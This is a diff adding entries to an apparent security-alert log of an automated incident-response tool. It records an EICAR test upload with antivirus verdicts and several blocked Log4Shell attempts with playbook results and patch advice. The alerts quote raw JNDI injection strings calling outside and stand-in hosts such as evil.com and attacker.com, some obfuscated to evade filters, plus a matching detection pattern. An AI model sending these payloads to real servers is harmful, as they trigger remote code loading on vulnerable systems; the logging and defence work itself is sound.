@@ -11572,5 +11572,4728 @@
     "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
     "eicar_detected": true,
     "upload_id": "28e0701e-b130-43b7-9ce2-e28ca7d980dc"
+  },
+  {
+    "id": "08500ee9-8670-4012-b1e3-a64184584b29",
+    "timestamp": "2026-03-08T01:52:04.759Z",
+    "source_ip": "192.168.65.1",
+    "enriched_ip": "89.248.167.131",
+    "alert_type": "malicious_upload",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "192.168.65.1",
+      "alert_type": "malicious_upload",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "file_name": "Eicar Test - Claude.txt",
+      "file_size": 68,
+      "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+      "eicar_detected": true,
+      "upload_id": "986778da-dced-4a95-96e7-066c5a2b5824",
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:45:51.630Z",
+          "level": "INFO",
+          "message": "File upload received from 192.168.65.1: Eicar Test - Claude.txt (68 bytes) sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+        },
+        {
+          "timestamp": "2026-03-08T01:45:51.630Z",
+          "level": "WARN",
+          "message": "EICAR test string detected in upload from 192.168.65.1: Eicar Test - Claude.txt"
+        },
+        {
+          "timestamp": "2026-03-08T01:45:51.631Z",
+          "level": "INFO",
+          "message": "Sending file to DART for VirusTotal analysis: Eicar Test - Claude.txt"
+        },
+        {
+          "timestamp": "2026-03-08T01:45:51.631Z",
+          "level": "INFO",
+          "message": "Firing malicious upload alert to DART for IP: 192.168.65.1 file: Eicar Test - Claude.txt"
+        },
+        {
+          "timestamp": "2026-03-08T01:45:52.272Z",
+          "level": "WARN",
+          "message": "File quarantined by DART: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f reason: VirusTotal detection rate: 91%"
+        },
+        {
+          "timestamp": "2026-03-08T01:45:52.283Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 192.168.65.1"
+        },
+        {
+          "timestamp": "2026-03-08T01:45:52.312Z",
+          "level": "INFO",
+          "message": "DART alert response: 200"
+        },
+        {
+          "timestamp": "2026-03-08T01:52:04.422Z",
+          "level": "INFO",
+          "message": "File upload received from 192.168.65.1: Eicar Test - Claude.txt (68 bytes) sha256=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+        },
+        {
+          "timestamp": "2026-03-08T01:52:04.422Z",
+          "level": "WARN",
+          "message": "EICAR test string detected in upload from 192.168.65.1: Eicar Test - Claude.txt"
+        },
+        {
+          "timestamp": "2026-03-08T01:52:04.422Z",
+          "level": "INFO",
+          "message": "Sending file to DART for VirusTotal analysis: Eicar Test - Claude.txt"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "89.248.167.131",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Recyber Scanning",
+        "tags": [
+          "scanner",
+          "web-crawler"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 9841,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 6,
+        "suspicious": 1,
+        "harmless": 66
+      },
+      "virustotal_file": {
+        "found": true,
+        "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+        "malicious": 62,
+        "suspicious": 0,
+        "harmless": 0,
+        "undetected": 6,
+        "total_engines": 68,
+        "detection_rate": 91,
+        "file_type": "EICAR Test File",
+        "file_size": 68,
+        "first_submission": "2006-05-15T12:00:00.000Z",
+        "last_analysis": "2026-03-08T01:34:59.066Z",
+        "meaningful_name": "eicar.com",
+        "tags": [
+          "eicar",
+          "test-file"
+        ],
+        "engines": {
+          "CrowdStrike": {
+            "category": "malicious",
+            "result": "Win.Test.EICAR_HDB-1",
+            "method": "blacklist",
+            "engine_version": "1.0"
+          },
+          "Fortinet": {
+            "category": "malicious",
+            "result": "EICAR_TEST_FILE",
+            "method": "blacklist",
+            "engine_version": "6.4"
+          },
+          "Kaspersky": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "22.0"
+          },
+          "McAfee": {
+            "category": "malicious",
+            "result": "EICAR test file",
+            "method": "blacklist",
+            "engine_version": "6.0"
+          },
+          "Microsoft": {
+            "category": "malicious",
+            "result": "Virus:DOS/EICAR_Test_File",
+            "method": "blacklist",
+            "engine_version": "1.1"
+          },
+          "Symantec": {
+            "category": "malicious",
+            "result": "EICAR Test String",
+            "method": "blacklist",
+            "engine_version": "1.21"
+          },
+          "TrendMicro": {
+            "category": "malicious",
+            "result": "Eicar_test_file",
+            "method": "blacklist",
+            "engine_version": "11.0"
+          },
+          "Avast": {
+            "category": "malicious",
+            "result": "EICAR Test-NOT virus!!!",
+            "method": "blacklist",
+            "engine_version": "23.1"
+          },
+          "AVG": {
+            "category": "malicious",
+            "result": "EICAR Test-NOT virus!!!",
+            "method": "blacklist",
+            "engine_version": "23.1"
+          },
+          "BitDefender": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "7.2"
+          },
+          "ESET-NOD32": {
+            "category": "malicious",
+            "result": "Eicar test file",
+            "method": "exact",
+            "engine_version": "27000"
+          },
+          "F-Secure": {
+            "category": "malicious",
+            "result": "EICAR_Test_File [Trj]",
+            "method": "blacklist",
+            "engine_version": "18.0"
+          },
+          "GData": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "25.36"
+          },
+          "Sophos": {
+            "category": "malicious",
+            "result": "EICAR-AV-Test",
+            "method": "blacklist",
+            "engine_version": "2.4"
+          },
+          "Panda": {
+            "category": "malicious",
+            "result": "EICAR-AV-TEST-FILE",
+            "method": "blacklist",
+            "engine_version": "4.6"
+          },
+          "Comodo": {
+            "category": "malicious",
+            "result": "ApplicUnwnt",
+            "method": "blacklist",
+            "engine_version": "35700"
+          },
+          "DrWeb": {
+            "category": "malicious",
+            "result": "EICAR Test File (NOT a Virus!)",
+            "method": "blacklist",
+            "engine_version": "7.0"
+          },
+          "Emsisoft": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus) (B)",
+            "method": "blacklist",
+            "engine_version": "2023.1"
+          },
+          "FireEye": {
+            "category": "malicious",
+            "result": "EICAR.TEST.FILE",
+            "method": "blacklist",
+            "engine_version": "35.24"
+          },
+          "Ikarus": {
+            "category": "malicious",
+            "result": "EICAR-ANTIVIRUS-TESTFILE",
+            "method": "exact",
+            "engine_version": "6.3"
+          },
+          "Jiangmin": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "16.0"
+          },
+          "K7AntiVirus": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "exact",
+            "engine_version": "12.100"
+          },
+          "K7GW": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "exact",
+            "engine_version": "12.100"
+          },
+          "Malwarebytes": {
+            "category": "malicious",
+            "result": "EICAR.test.file",
+            "method": "blacklist",
+            "engine_version": "4.5"
+          },
+          "MaxSecure": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Nano": {
+            "category": "malicious",
+            "result": "Marker.Dos.EICAR-Test-File.dyb",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Rising": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "25.0"
+          },
+          "SentinelOne": {
+            "category": "malicious",
+            "result": "DFI - Suspicious",
+            "method": "ai",
+            "engine_version": "23.3"
+          },
+          "Tencent": {
+            "category": "malicious",
+            "result": "EICAR.TEST.FILE",
+            "method": "blacklist",
+            "engine_version": "1.0"
+          },
+          "VIPRE": {
+            "category": "malicious",
+            "result": "EICAR (v)",
+            "method": "exact",
+            "engine_version": "100000"
+          },
+          "ViRobot": {
+            "category": "malicious",
+            "result": "EICAR-test",
+            "method": "blacklist",
+            "engine_version": "2014.3"
+          },
+          "Yandex": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "5.5"
+          },
+          "ZoneAlarm": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Zoner": {
+            "category": "malicious",
+            "result": "EICAR.Test",
+            "method": "exact",
+            "engine_version": "2.0"
+          },
+          "AhnLab-V3": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "exact",
+            "engine_version": "3.22"
+          },
+          "Arcabit": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "2022.0"
+          },
+          "Avira": {
+            "category": "malicious",
+            "result": "Eicar-Test-Signature",
+            "method": "blacklist",
+            "engine_version": "8.3"
+          },
+          "Baidu": {
+            "category": "malicious",
+            "result": "Win32.Test.EICAR.a",
+            "method": "exact",
+            "engine_version": "3.9"
+          },
+          "CAT-QuickHeal": {
+            "category": "malicious",
+            "result": "EICAR.TestFile",
+            "method": "exact",
+            "engine_version": "14.0"
+          },
+          "ClamAV": {
+            "category": "malicious",
+            "result": "Win.Test.EICAR_HDB-1",
+            "method": "blacklist",
+            "engine_version": "1.0"
+          },
+          "Cybereason": {
+            "category": "malicious",
+            "result": "EICAR_Test_File",
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Cylance": {
+            "category": "malicious",
+            "result": "Unsafe",
+            "method": "ai",
+            "engine_version": "2.3"
+          },
+          "CrowdStrike-Falcon": {
+            "category": "malicious",
+            "result": "Win/malicious_confidence_100%",
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Cynet": {
+            "category": "malicious",
+            "result": "Malicious (score: 100)",
+            "method": "ai",
+            "engine_version": "4.0"
+          },
+          "Elastic": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "ai",
+            "engine_version": "4.0"
+          },
+          "Sangfor": {
+            "category": "malicious",
+            "result": "Virus.Test.EICAR.a",
+            "method": "exact",
+            "engine_version": "2.14"
+          },
+          "Trellix": {
+            "category": "malicious",
+            "result": "EICAR test file",
+            "method": "blacklist",
+            "engine_version": "6.0"
+          },
+          "TrendMicro-VSAPI": {
+            "category": "malicious",
+            "result": "Eicar_test_file",
+            "method": "blacklist",
+            "engine_version": "18.0"
+          },
+          "VBA32": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "5.0"
+          },
+          "WithSecure": {
+            "category": "malicious",
+            "result": "EICAR_Test_File [Trj]",
+            "method": "blacklist",
+            "engine_version": "18.0"
+          },
+          "ZillaSecurity": {
+            "category": "malicious",
+            "result": "EICAR_Test",
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "ALYac": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "1.0"
+          },
+          "Antiy-AVL": {
+            "category": "malicious",
+            "result": "Virus/EICAR.Test",
+            "method": "exact",
+            "engine_version": "3.0"
+          },
+          "BitDefenderTheta": {
+            "category": "malicious",
+            "result": "EICAR-Test-File (not a virus)",
+            "method": "exact",
+            "engine_version": "7.2"
+          },
+          "Bkav": {
+            "category": "malicious",
+            "result": "DOS.EicarTest.Trojan",
+            "method": "exact",
+            "engine_version": "2.0"
+          },
+          "CMC": {
+            "category": "malicious",
+            "result": "EICAR-Test-File!080000",
+            "method": "exact",
+            "engine_version": "2.4"
+          },
+          "Lionic": {
+            "category": "malicious",
+            "result": "Test.File.EICAR.y!c",
+            "method": "exact",
+            "engine_version": "7.5"
+          },
+          "SUPERAntiSpyware": {
+            "category": "malicious",
+            "result": "NotAThreat.EICAR[TestFile]",
+            "method": "exact",
+            "engine_version": "5.6"
+          },
+          "TACHYON": {
+            "category": "malicious",
+            "result": "EICAR-Test-File",
+            "method": "exact",
+            "engine_version": "9.0"
+          },
+          "Varist": {
+            "category": "malicious",
+            "result": "EICAR test file",
+            "method": "exact",
+            "engine_version": "6.5"
+          },
+          "Zillya": {
+            "category": "malicious",
+            "result": "EICAR.TestFile",
+            "method": "exact",
+            "engine_version": "2.0"
+          },
+          "Acronis": {
+            "category": "undetected",
+            "result": null,
+            "method": "blacklist",
+            "engine_version": "1.2"
+          },
+          "Google": {
+            "category": "undetected",
+            "result": null,
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Kingsoft": {
+            "category": "undetected",
+            "result": null,
+            "method": "blacklist",
+            "engine_version": "2017.9"
+          },
+          "MicroWorld-eScan": {
+            "category": "undetected",
+            "result": null,
+            "method": "blacklist",
+            "engine_version": "14.0"
+          },
+          "Paloalto": {
+            "category": "undetected",
+            "result": null,
+            "method": "ai",
+            "engine_version": "1.0"
+          },
+          "Trustlook": {
+            "category": "undetected",
+            "result": null,
+            "method": "ai",
+            "engine_version": "1.0"
+          }
+        },
+        "raw_stats": {
+          "malicious": 62,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 6
+        }
+      }
+    },
+    "risk_score": 100,
+    "risk_reasoning": "File upload analysis: Eicar Test - Claude.txt — MALICIOUS. VirusTotal: 62 engines flagged as malicious (91% detection rate). File hash: 275a021bbfb6489e... Source IP AbuseIPDB score: 100/100.",
+    "selected_playbook": "file-quarantine",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "file-quarantine",
+      "steps_executed": [
+        "quarantine_file",
+        "block_ip"
+      ],
+      "success": true,
+      "file_quarantined": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+      "file_name": "Eicar Test - Claude.txt",
+      "ip_blocked": "192.168.65.1",
+      "virustotal_summary": {
+        "malicious": 62,
+        "suspicious": 0,
+        "detection_rate": 91,
+        "total_engines": 68
+      },
+      "quarantined_at": "2026-03-08T01:52:04.789Z",
+      "notes": "File quarantined based on VirusTotal verdict. 62 of 68 engines flagged as malicious. IP blocked permanently."
+    },
+    "analyst_feedback": null,
+    "file_name": "Eicar Test - Claude.txt",
+    "file_size": 68,
+    "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+    "eicar_detected": true,
+    "upload_id": "986778da-dced-4a95-96e7-066c5a2b5824"
+  },
+  {
+    "id": "5069e40e-6fb6-46c9-912d-8e3626a33752",
+    "timestamp": "2026-03-08T01:57:34.671Z",
+    "source_ip": "198.235.24.130",
+    "enriched_ip": "198.235.24.130",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "198.235.24.130",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://185.220.101.34/a",
+      "matched_headers": [
+        {
+          "header": "x-api-version",
+          "value": "${jndi:ldap://185.220.101.34/a}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "198.235.24.130",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Known Botnet C2",
+        "tags": [
+          "botnet",
+          "c2"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 87,
+        "totalReports": 1523,
+        "countryCode": "US"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 15,
+        "suspicious": 4,
+        "harmless": 52
+      }
+    },
+    "risk_score": 94,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: x-api-version. JNDI callback URL: ldap://185.220.101.34/a. GreyNoise: malicious [botnet, c2]. AbuseIPDB: 87/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "198.235.24.130",
+        "enriched_ip": "198.235.24.130",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "botnet",
+          "c2"
+        ],
+        "abuseipdb_score": 87,
+        "abuseipdb_reports": 1523,
+        "jndi_payload": "ldap://185.220.101.34/a",
+        "matched_headers": [
+          {
+            "header": "x-api-version",
+            "value": "${jndi:ldap://185.220.101.34/a}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3102,
+        "detected_at": "2026-03-08T01:57:34.671Z",
+        "contained_at": "2026-03-08T01:57:37.773Z"
+      },
+      "ip_blocked": "198.235.24.130",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3102,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://185.220.101.34/a",
+    "matched_headers": [
+      {
+        "header": "x-api-version",
+        "value": "${jndi:ldap://185.220.101.34/a}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "509f2622-8c90-4fc1-a358-337259ebe566",
+    "timestamp": "2026-03-08T01:57:34.661Z",
+    "source_ip": "45.142.212.100",
+    "enriched_ip": "45.142.212.100",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "45.142.212.100",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "${lower:l",
+      "matched_headers": [
+        {
+          "header": "accept-language",
+          "value": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 198.235.24.130 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.605Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.611Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.123Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "45.142.212.100",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Mass Scanner",
+        "tags": [
+          "scanner",
+          "bruteforce"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 5213,
+        "countryCode": "RU"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 8,
+        "suspicious": 2,
+        "harmless": 63
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: accept-language. JNDI callback URL: ${lower:l. GreyNoise: malicious [scanner, bruteforce]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "45.142.212.100",
+        "enriched_ip": "45.142.212.100",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "bruteforce"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 5213,
+        "jndi_payload": "${lower:l",
+        "matched_headers": [
+          {
+            "header": "accept-language",
+            "value": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3119,
+        "detected_at": "2026-03-08T01:57:34.661Z",
+        "contained_at": "2026-03-08T01:57:37.781Z"
+      },
+      "ip_blocked": "45.142.212.100",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3119,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "${lower:l",
+    "matched_headers": [
+      {
+        "header": "accept-language",
+        "value": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "f5627290-ac78-4615-8f5a-da3f71803b9f",
+    "timestamp": "2026-03-08T01:57:34.676Z",
+    "source_ip": "185.220.101.34",
+    "enriched_ip": "185.220.101.34",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "185.220.101.34",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "rmi://45.142.212.100:1099/exploit",
+      "matched_headers": [
+        {
+          "header": "x-client-ip",
+          "value": "${jndi:rmi://45.142.212.100:1099/exploit}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 198.235.24.130 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.605Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.611Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.123Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.123Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.131Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.138Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "185.220.101.34",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Tor Exit Node",
+        "tags": [
+          "tor",
+          "vpn"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 2847,
+        "countryCode": "DE"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 12,
+        "suspicious": 3,
+        "harmless": 58
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: x-client-ip. JNDI callback URL: rmi://45.142.212.100:1099/exploit. GreyNoise: malicious [tor, vpn]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "185.220.101.34",
+        "enriched_ip": "185.220.101.34",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "tor",
+          "vpn"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 2847,
+        "jndi_payload": "rmi://45.142.212.100:1099/exploit",
+        "matched_headers": [
+          {
+            "header": "x-client-ip",
+            "value": "${jndi:rmi://45.142.212.100:1099/exploit}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
